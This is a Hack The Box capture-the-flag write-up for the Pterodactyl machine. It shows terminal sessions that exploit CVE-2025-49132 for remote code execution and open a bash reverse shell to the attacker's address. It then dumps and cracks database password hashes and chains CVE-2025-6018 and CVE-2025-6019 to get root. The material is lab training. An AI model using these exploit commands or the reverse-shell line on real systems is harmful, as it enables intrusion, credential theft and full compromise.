| Category          | Details                                                                                                                                                                                                                               |
|-------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Pterodactyl](https://app.hackthebox.com/machines/Pterodactyl)                                                                                                                                                                        |  
| 🏷 **Type**       | HTB Machine                                                                                                                                                                                                                           |
| 🖥 **OS**         | Linux                                                                                                                                                                                                                                 |
| 🎯 **Difficulty** | Medium                                                                                                                                                                                                                                |
| 📁 **Tags**       | Pterodactyl 1.11.10, [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132), PAM, [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018), udisks, [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 07:58 +0200
Nmap scan report for 10.129.45.169
Host is up (0.035s latency).
Not shown: 65376 filtered tcp ports (no-response), 155 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.17 seconds
```

#### Add `pterodactyl.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ echo "$TARGET pterodactyl.htb" | sudo tee -a /etc/hosts 
10.129.45.169 pterodactyl.htb
```

#### Enumerate virtual hosts
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ ffuf -u http://pterodactyl.htb/ -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145
<SNIP>
panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 407ms]
<SNIP>
```

#### Add `panel.pterodactyl.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ echo "$TARGET panel.pterodactyl.htb" | sudo tee -a /etc/hosts
10.129.45.169 panel.pterodactyl.htb
```
After landing at `panel.pterodactyl.htb` we can see that Pterodactyl game server management panel is running there. This instance might be vulnerable to [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132)

#### Confirm target is vulnerable to [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132)
[YoyoChaud/CVE-2025-49132](https://github.com/YoyoChaud/CVE-2025-49132.git) has been used to exploit vulnerability.
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ git clone -q https://github.com/YoyoChaud/CVE-2025-49132.git && \
python3 ./CVE-2025-49132/exploit.py http://panel.pterodactyl.htb/ --rce-cmd "id" --pear-dir /usr/share/php/PEAR

  ___ __   __ ___      ___   ___  ___  ___        _  _   ___  _  ____  ___ 
 / __|\ \ / /| __|___ |_  ) / _ \|_  )| __|___   | || | / _ \| ||__ / |_  )
| (__  \ V / | _|___|  / / | (_) |/ / |__ \___|  |_  _| \_, /| ||_ \  / / 
 \___|  \_/  |___|    /___| \___//___||___/        |_|   /_/ |_|___/ /___|

  Pterodactyl Panel - Unauthenticated Exploit
  Targets: <= 1.11.10 | Patched: 1.11.11
  Exploit By YoyoChaud


════════════════════════════════════════════════════════════
  VULNERABILITY CHECK
════════════════════════════════════════════════════════════
  [*] Target: http://panel.pterodactyl.htb
  [+] Endpoint accessible without hash parameter
  [+] TARGET IS VULNERABLE

════════════════════════════════════════════════════════════
  RCE (pearcmd) — id
════════════════════════════════════════════════════════════
  [+] Output:
uid=474(wwwrun) gid=477(www) groups=477(www)
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Exploit [CVE-2025-49132](https://nvd.nist.gov/vuln/detail/CVE-2025-49132) to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ python3 ./CVE-2025-49132/exploit.py http://panel.pterodactyl.htb/ --rce-cmd "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" --pear-dir /usr/share/php/PEAR

  ___ __   __ ___      ___   ___  ___  ___        _  _   ___  _  ____  ___ 
 / __|\ \ / /| __|___ |_  ) / _ \|_  )| __|___   | || | / _ \| ||__ / |_  )
| (__  \ V / | _|___|  / / | (_) |/ / |__ \___|  |_  _| \_, /| ||_ \  / / 
 \___|  \_/  |___|    /___| \___//___||___/        |_|   /_/ |_|___/ /___|

  Pterodactyl Panel - Unauthenticated Exploit
  Targets: <= 1.11.10 | Patched: 1.11.11
  Exploit By YoyoChaud


════════════════════════════════════════════════════════════
  VULNERABILITY CHECK
════════════════════════════════════════════════════════════
  [*] Target: http://panel.pterodactyl.htb
  [+] Endpoint accessible without hash parameter
  [+] TARGET IS VULNERABLE

════════════════════════════════════════════════════════════
  RCE (pearcmd) — /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.193/4444 0>&1'
════════════════════════════════════════════════════════════
```

#### Confirm foothold gained
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.45.169] 46876
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
wwwrun@pterodactyl:/var/www/pterodactyl/public> id
uid=474(wwwrun) gid=477(www) groups=477(www)
```

#### Capture user flag
```
wwwrun@pterodactyl:~> cat /home/phileasfogg3/user.txt 
987e72fb9c3385081fcb5675c2f7d5c7
```

#### Root flag

#### Read Pterodactyl database configuration file
```
wwwrun@pterodactyl:~> cat -n /var/www/pterodactyl/config/database.php
<SNIP>
    39              'url' => env('DATABASE_URL'),
    40              'host' => env('DB_HOST', '127.0.0.1'),
    41              'port' => env('DB_PORT', '3306'),
    42              'database' => env('DB_DATABASE', 'panel'),
    43              'username' => env('DB_USERNAME', 'pterodactyl'),
    44              'password' => env('DB_PASSWORD', ''),
<SNIP>
```

#### Discover database credentials in env vars
```
wwwrun@pterodactyl:~> env | grep DB
DB_PORT=3306
DB_HOST=127.0.0.1
DB_PASSWORD=PteraPanel
DB_USERNAME=pterodactyl
DB_CONNECTION=mysql
DB_DATABASE=panel
```

#### 
```
wwwrun@pterodactyl:~> mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel -D panel
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 88
Server version: 11.8.3-MariaDB MariaDB package

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [panel]> SHOW TABLES;
+-----------------------+
| Tables_in_panel       |
+-----------------------+
<SNIP>
| user_ssh_keys         |
<SNIP>
+-----------------------+
35 rows in set (0.001 sec)

MariaDB [panel]> SELECT username, password FROM users;
+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+--------------+--------------------------------------------------------------+
2 rows in set (0.000 sec)
```

#### Crack password hash for user `phileasfogg3`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ hashcat -m 3200 hash.txt rockyou.txt --quiet
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

#### Access target over SSH using `phileasfogg3:!QAZ2wsx` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ ssh phileasfogg3@pterodactyl.htb
(phileasfogg3@pterodactyl.htb) Password: 
Have a lot of fun...
Last login: Fri May 15 09:41:46 2026 from 10.10.16.193
phileasfogg3@pterodactyl:~> id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)
```

#### Read email for user `phileasfogg3`
```
phileasfogg3@pterodactyl:~> mail
Heirloom mailx version 12.5 7/5/10.  Type ? for help.
"/var/spool/mail/phileasfogg3": 1 message 1 new
>N  1 headmonitorheadmon Fri Nov 07 09:15   23/960   SECURITY NOTICE — Unusual udisksd activity (stay alert)
? 1

Message  1:
From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Date: Fri, 07 Nov 2025 09:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator
```
Email states that there were attempts to compromise system via `udisks` daemon exploitation. With this hint and simple [Google query](https://www.google.com/search?q=udisks+LPE) we were able to identify potential chain of 2 vulnerabilities [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018) and [CVE-2025-6019](https://nvd.nist.gov/vuln/detail/CVE-2025-6019).

#### Prepare XFS filesystem image with an SUID `bash` binary
[guinea-offensive-security/CVE-2025-6019.git](https://github.com/guinea-offensive-security/CVE-2025-6019.git) will be used in both, local and target phase.
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ git clone -q https://github.com/guinea-offensive-security/CVE-2025-6019.git && \
chmod +x CVE-2025-6019/exploit.sh && \
sudo ./CVE-2025-6019/exploit.sh
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: y
[+] All dependencies are installed.
[*] Checking for vulnerable libblockdev/udisks versions...
[*] Detected udisks version: unknown
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
[!] Continuing with PoC execution...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): l
[*] Creating a 300 MB XFS image on local machine...
230686720 bytes (231 MB, 220 MiB) copied, 1 s, 230 MB/s
300+0 records in
300+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 1.15044 s, 273 MB/s
meta-data=./xfs.image            isize=512    agcount=4, agsize=19200 blks
         =                       sectsz=512   attr=2, projid32bit=1
         =                       crc=1        finobt=1, sparse=1, rmapbt=1
         =                       reflink=1    bigtime=1 inobtcount=1 nrext64=1
         =                       exchange=0   metadir=0
data     =                       bsize=4096   blocks=76800, imaxpct=25
         =                       sunit=0      swidth=0 blks
naming   =version 2              bsize=4096   ascii-ci=0, ftype=1, parent=0
log      =internal log           bsize=4096   blocks=16384, version=2
         =                       sectsz=512   sunit=0 blks, lazy-count=1
realtime =none                   extsz=4096   blocks=0, rtextents=0
         =                       rgcount=0    rgsize=0 extents
         =                       zoned=0      start=0 reserved=0
[+] 300 MB XFS image created: ./xfs.image
[*] Transfer to target with: scp xfs.image <user>@<host>:
```

#### Deliver `xfs.image` to target
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ scp -q xfs.image phileasfogg3@pterodactyl.htb:~/
(phileasfogg3@pterodactyl.htb) Password:     
```

#### Deliver [guinea-offensive-security/CVE-2025-6019.git](https://github.com/guinea-offensive-security/CVE-2025-6019.git) to target
Prior to delivering exploit to the target we will disable dependency check, as it fails on target for `[C]ible` mode.
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ sed -i 's/^\(check_dependencies\b\s*$\)/#\1/' ./CVE-2025-6019/exploit.sh && \
scp -q CVE-2025-6019/exploit.sh phileasfogg3@pterodactyl.htb:~/
(phileasfogg3@pterodactyl.htb) Password:
```

#### Exploit [CVE-2025-6018](https://nvd.nist.gov/vuln/detail/CVE-2025-6018) to escalate session to `allow_active`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pterodactyl]
└─$ wget -q https://www.exploit-db.com/raw/52386 -O CVE-2025-6018.py && \
python3 ./CVE-2025-6018.py -i pterodactyl.htb -u phileasfogg3 -p '!QAZ2wsx'
2026-05-15 14:42:51 [WARNING] Use only with proper authorization!
2026-05-15 14:42:51 [INFO] Starting CVE-2025-6018 exploit against pterodactyl.htb:22
2026-05-15 14:42:51 [INFO] Connecting to pterodactyl.htb:22 as phileasfogg3
2026-05-15 14:42:52 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-05-15 14:42:52 [INFO] Authentication (publickey) failed.
2026-05-15 14:42:53 [INFO] Authentication (password) successful!
2026-05-15 14:42:53 [INFO] SSH connection established
2026-05-15 14:42:53 [INFO] Starting vulnerability assessment
2026-05-15 14:42:53 [INFO] Executing check: pam_version
2026-05-15 14:42:53 [INFO] Vulnerable PAM version detected: pam-1.3.0
2026-05-15 14:42:54 [INFO] Executing check: pam_env
2026-05-15 14:42:54 [INFO] pam_env.so configuration found
2026-05-15 14:42:54 [INFO] Executing check: pam_systemd
2026-05-15 14:42:55 [INFO] pam_systemd.so found - escalation vector available
2026-05-15 14:42:55 [INFO] Executing check: systemd_version
2026-05-15 14:42:56 [INFO] Target appears vulnerable, proceeding with exploitation
2026-05-15 14:42:56 [INFO] Creating malicious environment file
2026-05-15 14:42:56 [INFO] Writing .pam_environment file
2026-05-15 14:42:56 [INFO] Malicious environment file created successfully
2026-05-15 14:42:56 [INFO] Reconnecting to trigger PAM environment loading
2026-05-15 14:42:58 [INFO] Connected (version 2.0, client OpenSSH_9.6)
2026-05-15 14:42:59 [INFO] Authentication (publickey) failed.
2026-05-15 14:42:59 [INFO] Authentication (password) successful!
2026-05-15 14:42:59 [INFO] Reconnection successful
2026-05-15 14:42:59 [INFO] Testing privilege escalation vectors
2026-05-15 14:42:59 [INFO] Testing: SystemD Reboot
2026-05-15 14:43:00 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot
2026-05-15 14:43:00 [INFO] Testing: SystemD Shutdown
2026-05-15 14:43:00 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown
2026-05-15 14:43:00 [INFO] Testing: PolicyKit Check
2026-05-15 14:43:01 [INFO] No escalation detected: PolicyKit Check
2026-05-15 14:43:01 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed
2026-05-15 14:43:01 [INFO] Starting interactive shell session

--- Interactive Shell ---
Commands: 'exit' to quit, 'status' for privilege check
exploit$
```

####
```
exploit$ ./exploit.sh
./exploit.sh
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)
WARNING: Only run this on authorized systems. Unauthorized use is illegal.
Continue? [y/N]: exploit$ y
y
[*] Checking for vulnerable libblockdev/udisks versions...
[*] Detected udisks version: unknown
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.
[!] Continuing with PoC execution...
Select mode:
[L]ocal: Create 300 MB XFS image (requires root)
[C]ible: Exploit target system
[L]ocal or [C]ible? (L/C): exploit$ c
c
[*] Starting exploitation on target machine...
[*] Checking allow_active status...
[+] allow_active status confirmed.
[*] Verifying xfs.image integrity...
exploit$ id
[*] Stopping gvfs-udisks2-volume-monitor...
[*] Note: gvfs-udisks2-volume-monitor was not running.
[*] Setting up loop device...
[+] Loop device configured: /dev/loop0
[*] Keeping filesystem busy to prevent unmounting...
[+] Background loop started (PID: 24377)
[*] Resizing filesystem to trigger mount...
[+] Mount successful (expected error: target is busy).
[*] Waiting 2 seconds for mount to stabilize...
[*] Checking for SUID bash in /tmp/blockdev*...
[+] SUID bash found: /tmp/blockdev.H9UOP3/bash
-rwsr-xr-x 1 root root 1380656 May 15 10:17 /tmp/blockdev.H9UOP3/bash
[*] Executing root shell...
bash-5.3# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```

#### Capture root flag
```
bash-5.3# exploit$ cat /root/root.txt
-rwsr-xr-x 1 root root 1380656 May 15 10:17 /tmp/blockdev.H9UOP3/bash
cat /root/root.txt
36e3a522e1c72c87b38c336a4b7b1053
```
